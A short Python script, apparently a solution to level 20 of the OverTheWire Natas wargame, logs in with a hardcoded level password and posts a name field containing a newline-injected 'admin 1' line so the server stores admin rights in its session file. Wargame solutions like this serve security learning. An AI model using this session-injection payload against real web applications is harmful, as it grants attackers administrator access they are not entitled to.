#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
import re
from string import *
from time import *

characters = lowercase + uppercase + digits

username = 'natas20'
password = 'eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF'

url = 'http://%s.natas.labs.overthewire.org/?debug=true' % username

session = requests.Session()
response = session.get(url, auth = (username,password))
print response.text
print '='*80

response = session.post(url, data = {"name":"roberto%0Aadmin 1"},auth = (username,password))
print response.text
print '='*80